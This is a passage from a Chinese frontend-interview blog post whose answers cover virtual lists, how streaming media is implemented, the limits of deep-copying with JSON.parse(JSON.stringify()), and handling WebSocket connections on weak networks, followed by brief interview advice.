<li><p><strong>使用 CDN（内容分发网络）：</strong> CDN 提供分布式的缓存和加速服务，可以显著减少 DNS 解析的次数，同时提高网页加载速度。</p>
</li>
</ol>
<p>综合利用这些方法，可以加速 DNS 解析的速度，从而改善用户的网页加载体验。然而，需要注意的是，DNS 解析通常只占整个网页加载时间的一小部分，网站性能的提升还需要考虑其他因素，如网络延迟、服务器响应时间、资源加载等。</p>
<h3 id="14、虚拟列表"><a href="#14、虚拟列表" class="headerlink" title="14、虚拟列表"></a>14、虚拟列表</h3><p>虚拟列表（Virtual List）是一种优化技术，通常用于处理大型数据集的渲染问题，以提高前端应用程序的性能和用户体验。其基本原理是只渲染可见区域内的列表项，而不是将整个列表渲染到 DOM 中。这样可以减少 DOM 元素的数量，从而减少渲染和布局的开销，提高页面的响应速度。</p>
<p>以下是虚拟列表的基本原理：</p>
<ol>
<li><p><strong>确定可见区域</strong>：首先，需要确定可见区域的大小，通常是列表容器的高度。这个可见区域通常称为视口（Viewport）。</p>
</li>
<li><p><strong>计算列表项的高度</strong>：每个列表项的高度通常是固定的，但在某些情况下也可以是可变的。你需要知道每个列表项的高度，以便在渲染时进行定位。</p>
</li>
<li><p><strong>计算列表项的总高度</strong>：通过将每个列表项的高度相加，可以计算出整个列表的总高度。</p>
</li>
<li><p><strong>计算可见区域内的列表项</strong>：根据可见区域的高度和位置，计算出可见区域内应该渲染的列表项的数量。通常，这涉及到计算第一个可见项的索引和最后一个可见项的索引。</p>
</li>
<li><p><strong>只渲染可见区域内的列表项</strong>：只有可见区域内的列表项被渲染到 DOM 中，而不是将整个列表渲染出来。这可以通过设置元素的样式（例如 <code>overflow: hidden;</code>）来隐藏不可见的部分。</p>
</li>
<li><p><strong>监听滚动事件</strong>：为了实现滚动时动态加载和卸载列表项，需要监听滚动事件。当用户滚动列表时，计算哪些列表项需要进入视口，哪些需要离开视口，并相应地进行渲染和卸载。</p>
</li>
<li><p><strong>更新渲染的列表项</strong>：根据滚动位置和可见区域的变化，更新渲染的列表项，通常使用 JavaScript 来实现。</p>
</li>
</ol>
<p>虚拟列表的实现可以相对复杂，但它可以显著提高处理大型数据集的性能。这种技术通常与现代前端框架（如React、Vue）或列表组件库结合使用，这些框架和库通常提供了虚拟列表的实现。虚拟列表还可以与懒加载（Lazy Loading）结合使用，以在需要时动态加载数据，进一步提高性能。</p>
<p>需要注意的是，虚拟列表的实现可以因框架和库的不同而有所不同，但它的核心原理是只渲染可见区域内的列表项，以减少渲染开销。</p>
<h5 id="虚拟列表减少多少加载时间"><a href="#虚拟列表减少多少加载时间" class="headerlink" title="虚拟列表减少多少加载时间"></a>虚拟列表减少多少加载时间</h5><p>虚拟列表（Virtual List）通常可以带来以下几个方面的性能优势：</p>
<ol>
<li><p><strong>更快的初始加载时间：</strong> 当列表非常大时，只渲染可见区域的列表项可以显著减少初始页面加载时间。因为不需要一次性渲染所有列表项，用户可以更快地看到部分内容。</p>
</li>
<li><p><strong>更低的内存消耗：</strong> 不渲染不可见区域的列表项可以减少页面的内存占用，这对于移动设备和性能较低的设备尤其重要。</p>
</li>
<li><p><strong>更平滑的滚动体验：</strong> 虚拟列表通常与滚动加载（Infinite Scroll）结合使用，这意味着当用户滚动列表时，只会渲染新可见区域的列表项，使得滚动更加平滑，不会因为加载大量列表项而产生卡顿。</p>
</li>
<li><p><strong>更好的交互性能：</strong> 虚拟列表可以提高列表的响应速度，因为只有可见区域的列表项需要交互响应，而不是整个列表。</p>
</li>
<li><p><strong>更少的网络请求：</strong> 在与后端进行数据交互时，虚拟列表通常会更智能地加载数据，仅请求可见区域的数据，而不是一次性请求整个列表的数据。</p>
</li>
</ol>
<p>总的来说，虚拟列表技术可以大幅改善大型列表的性能，减少加载时间和提高用户体验。然而，实际的性能优势取决于具体的实现方式、数据量以及浏览器和设备的性能。因此，在构建大型列表时，考虑使用虚拟列表来优化性能是一个明智的选择。</p>
<h3 id="15、介绍一下流媒体怎么实现"><a href="#15、介绍一下流媒体怎么实现" class="headerlink" title="15、介绍一下流媒体怎么实现"></a>15、介绍一下流媒体怎么实现</h3><p>流媒体是一种用于实时传输音频和视频内容的技术，它允许用户在数据下载的同时播放音频或视频，而不需要等待整个文件下载完成。流媒体的实现涉及多个关键组件和技术，以下是一个概述：</p>
<ol>
<li><p><strong>媒体编码：</strong> 首先，音频和视频内容需要经过媒体编码，以将其转换为数字格式，如AAC（音频编码）和H.264（视频编码）。这些编码通常具有压缩特性，以减小数据量并提高传输效率。</p>
</li>
<li><p><strong>媒体服务器：</strong> 媒体服务器是用于存储和分发音视频流的服务器。它们通常支持流式传输协议（如HTTP Live Streaming（HLS）或Dynamic Adaptive Streaming over HTTP（DASH））以及流式传输协议（如Real-Time Messaging Protocol（RTMP））等。媒体服务器可以在云端或本地部署，视需求而定。</p>
</li>
<li><p><strong>流式传输协议：</strong> 流式传输协议是用于将音频和视频流传送到用户设备的协议。以下是一些常见的流媒体协议：</p>
<ul>
<li><strong>HTTP Live Streaming (HLS)：</strong> HLS 是由苹果开发的流媒体协议，它将音视频内容划分为小片段，使用HTTP协议传输，允许适应不同带宽和设备。</li>
<li><strong>Dynamic Adaptive Streaming over HTTP (DASH)：</strong> DASH 是一个开放标准的流媒体协议，类似于HLS，它允许内容分段并使用HTTP进行分发。</li>
<li><strong>Real-Time Messaging Protocol (RTMP)：</strong> RTMP 是一种实时流媒体传输协议，通常用于直播和互动媒体。</li>
<li><strong>WebRTC：</strong> WebRTC（Web Real-Time Communication）是一个支持浏览器间实时音视频通信的开放标准，通常用于实时通信应用和视频会议。</li>
</ul>
</li>
<li><p><strong>流媒体客户端：</strong> 流媒体客户端是用户用于播放音频和视频流的应用程序或设备，如Web浏览器、移动应用、智能电视或流媒体播放器。这些客户端可以解码和呈现音视频内容，并提供用户交互和控制功能。</p>
</li>
<li><p><strong>自适应比特率：</strong> 流媒体系统通常支持自适应比特率（Adaptive Bitrate）技术，以根据用户设备的带宽和性能动态调整音视频质量。这意味着用户可以在不同网络条件下获得最佳的观看体验。</p>
</li>
<li><p><strong>内容分发网络（CDN）：</strong> CDN 是一种用于加速内容传输的网络，它通过分布式缓存和就近提供内容来减少延迟和提高流媒体质量。CDN 可以帮助确保音视频内容可以快速传送给全球观众。</p>
</li>
</ol>
<p>流媒体的实现需要考虑带宽管理、内容保护、实时编码、传输优化等多个方面的技术和策略。不同的流媒体平台和应用程序可能会选择不同的技术栈和协议，以满足其特定需求。流媒体技术在在线视频、音频直播、视频会议、在线游戏等领域得到广泛应用。</p>
<h3 id="16、如果用JSON-pare-JSON-stringfy-…-来实现深拷贝的话-会有什么问题吗"><a href="#16、如果用JSON-pare-JSON-stringfy-…-来实现深拷贝的话-会有什么问题吗" class="headerlink" title="16、如果用JSON.pare(JSON.stringfy(…))来实现深拷贝的话 会有什么问题吗"></a>16、如果用JSON.pare(JSON.stringfy(…))来实现深拷贝的话 会有什么问题吗</h3><p>使用<code>JSON.parse(JSON.stringify(...))</code>来实现深拷贝通常是有效的，但它存在一些限制和问题：</p>
<ol>
<li><p><strong>不能处理循环引用：</strong> 如果对象中包含循环引用，例如对象A包含一个指向自身的属性，那么<code>JSON.stringify</code>会抛出错误，因为JSON不支持循环引用。</p>
</li>
<li><p><strong>不能拷贝非JSON安全的对象：</strong> <code>JSON.stringify</code>将对象转换为JSON字符串，因此它不能处理特定类型的对象，如函数、正则表达式、<code>Map</code>、<code>Set</code>等。这些对象在转换过程中会被忽略或转换成<code>null</code>。</p>
</li>
<li><p><strong>不能拷贝特定对象的原型链：</strong> 使用<code>JSON.parse(JSON.stringify(...))</code>会创建一个新的对象，其原型链上的方法和属性都丢失。这可能不是您想要的行为，尤其是当对象的原型链中包含自定义的方法时。</p>
</li>
<li><p><strong>性能问题：</strong> 对于大型对象或嵌套层次深的对象，序列化和反序列化的性能开销较大，可能比其他深拷贝方法慢。</p>
</li>
</ol>
<p>如果您的数据结构是简单的JSON对象，而且不包含循环引用或非JSON安全的对象，那么<code>JSON.parse(JSON.stringify(...))</code>是一个方便且有效的深拷贝方法。但如果您的需求更复杂，需要处理循环引用、保留原型链或拷贝非JSON安全对象，那么您可能需要考虑使用专门的深拷贝库，或者编写自己的深拷贝函数来处理这些情况。</p>
<h3 id="17、websocket在弱网环境怎么办"><a href="#17、websocket在弱网环境怎么办" class="headerlink" title="17、websocket在弱网环境怎么办"></a>17、websocket在弱网环境怎么办</h3><p>WebSocket在弱网环境下可能会面临连接不稳定或断开的问题，这可能会影响实时通信的可靠性。以下是一些应对WebSocket在弱网环境中的问题的方法：</p>
<ol>
<li><p><strong>重连机制：</strong> 实现WebSocket的重连机制，以处理连接断开的情况。当检测到WebSocket连接断开时，您可以尝试重新建立连接，可以设置一个重连的时间间隔，避免过于频繁的重连。</p>
</li>
<li><p><strong>心跳检测：</strong> 使用心跳检测来监控WebSocket连接的状态。定期向服务器发送一个心跳消息，如果一段时间内没有收到响应，就认为连接已断开，并尝试重新连接。</p>
</li>
<li><p><strong>优化网络请求：</strong> 减少不必要的网络请求以降低网络带宽占用。只发送关键数据，避免发送大量不必要的信息。</p>
</li>
<li><p><strong>消息队列：</strong> 使用消息队列来缓冲待发送的消息，确保在网络不稳定或连接断开时，消息不会丢失。一旦连接恢复，将未发送的消息重新发送。</p>
</li>
<li><p><strong>断点续传：</strong> 对于大型数据传输，实现断点续传机制，以便在连接断开后能够恢复传输进度。</p>
</li>
<li><p><strong>使用CDN和负载均衡：</strong> 使用内容分发网络（CDN）可以降低网络延迟，并使用负载均衡来确保WebSocket连接分散在多个服务器上，以提高可用性和稳定性。</p>
</li>
<li><p><strong>降低数据频率：</strong> 如果可能的话，减少数据更新的频率。在弱网环境中，减少数据的传输频率可以减轻网络负担。</p>
</li>
<li><p><strong>使用备用通信通道：</strong> 考虑实现备用通信通道，例如长轮询或服务器发送事件（SSE），以便在WebSocket连接不可用时使用备用通道进行通信。</p>
</li>
<li><p><strong>用户体验处理：</strong> 提供用户友好的界面，以通知用户网络连接问题并提供恢复连接的选项。</p>
</li>
<li><p><strong>错误处理和日志记录：</strong> 实现详细的错误处理和日志记录，以便能够诊断和解决网络问题。</p>
</li>
</ol>
<p>在弱网环境下，网络不稳定是不可避免的，但通过实施上述策略，可以提高WebSocket应用程序在这种情况下的可靠性和鲁棒性。</p>
<h2 id="经验总结"><a href="#经验总结" class="headerlink" title="经验总结"></a>经验总结</h2><p>问题主要来自自己的面试总结及牛客上的面经，答案来自chatgpt，少部分来自中文网络。</p>
<p>面试经验：</p>
<ul>
<li>一个问题应作为一个启发点，需要刨根问底的真正理解，因为部分面试官会深挖，可以从 <strong>如何说（完整流程，可以延伸的点）&#x2F;如何用（适用场景、相关api）</strong> 两个方面来检测自己是否真的理解。</li>
<li>简历上的任何字眼都可能被拓展，很多面试官都是对着简历问细节，这比别人的面经更重要</li>
</ul>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/blog/categories/%E5%89%8D%E7%AB%AF/" class="category-chain-item">前端</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/blog/tags/%E5%89%8D%E7%AB%AF/">#前端</a>
      
        <a href="/blog/tags/%E9%9D%A2%E8%AF%95/">#面试</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>面试题总结</div>
      <div>https://yoonalis.github.io/blog/2023/09/19/前端面试题总结/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Azure</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年9月19日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/blog/2023/10/02/formily/" title="formily">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">formily</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/blog/2023/09/15/React%20&amp;%20TypeScript%E5%A4%87%E5%BF%98%E5%BD%95/" title="React &amp; TypeScript备忘录">
                        <span class="hidden-mobile">React &amp; TypeScript备忘录</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/blog/js/events.js" ></script>
<script  src="/blog/js/plugins.js" ></script>


  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/blog/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/blog/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  
<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/caidai.js"></script>
<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/love.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/blog/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
